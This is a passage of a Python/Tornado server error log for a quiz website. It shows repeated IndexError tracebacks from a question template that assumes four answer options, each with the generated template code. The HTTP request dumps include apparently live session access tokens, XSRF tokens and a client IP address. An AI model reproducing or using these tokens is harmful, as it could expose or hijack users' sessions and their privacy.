 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b50b88e4c85480ff4f8c7&answers=%5B2%5D&cursor=16&_xsrf=ea84813aec1e47c391f7622ae7882a21', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFNa1EzN1I2OWloTGVUWkN6Z2JtbElkOUhpVDVLOTEyUXFSUEpaQ1pDTEpjMm5lelpBVnNKd01iNjVqdm5HQjNSUEd1WkNXb212TlZaQXQ0NDVPc1ZNZ2l4VUZNa2xBZ1pEWkQ=|1348161607|71edbaa2322f825ac6591d428bf49ad868d037cd"; _xsrf=ea84813aec1e47c391f7622ae7882a21; __utma=188782963.222067907.1348161586.1348161586.1348161586.1; __utmb=188782963.9.10.1348161586; __utmc=188782963; __utmz=188782963.1348161586.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 85.20ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b51818e4c8548017fb42b&answers=%5B2%5D&cursor=2&_xsrf=f74130c103854679aa37dc4a8aa7acd2', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '92', 'Accept-Language': 'en-us,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '__utma=188782963.1097451186.1347966769.1347966769.1348161699.2; __utmz=188782963.1347966769.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token=QUFBRzZsTmNzNkdjQkFBb2I5dmczT2daQ045SG9zdHZKQ29KcEIwZk5VVklPSGdNc1FxeXRmdjh6M2oxYmZQYVRQUkpaQVdkNDhiNXVUVkJFWkEwUFpDbTFCYm9WVWVZVzJjcG81dHhIU2daRFpE|1347966804|592d2f30a824720894e734a73a82ffbedae24780; _xsrf=f74130c103854679aa37dc4a8aa7acd2; __utmb=188782963.4.10.1348161699; __utmc=188782963', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 160.39ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b51818e4c8548017fb42b&answers=%5B3%5D&cursor=13&_xsrf=f74130c103854679aa37dc4a8aa7acd2', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '93', 'Accept-Language': 'en-us,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '__utma=188782963.1097451186.1347966769.1347966769.1348161699.2; __utmz=188782963.1347966769.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token=QUFBRzZsTmNzNkdjQkFBb2I5dmczT2daQ045SG9zdHZKQ29KcEIwZk5VVklPSGdNc1FxeXRmdjh6M2oxYmZQYVRQUkpaQVdkNDhiNXVUVkJFWkEwUFpDbTFCYm9WVWVZVzJjcG81dHhIU2daRFpE|1347966804|592d2f30a824720894e734a73a82ffbedae24780; _xsrf=f74130c103854679aa37dc4a8aa7acd2; __utmb=188782963.4.10.1348161699; __utmc=188782963', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 81.38ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
